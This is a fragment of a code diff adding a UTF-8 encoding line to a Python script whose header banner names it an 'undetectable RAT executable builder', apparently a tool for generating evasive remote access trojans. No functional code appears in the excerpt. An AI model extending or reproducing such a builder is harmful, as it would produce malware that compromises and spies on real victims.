@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
 ═══════════════════════════════════════════════════════════════════════════════
     UNDETECTABLE RAT EXECUTABLE BUILDER v3.0
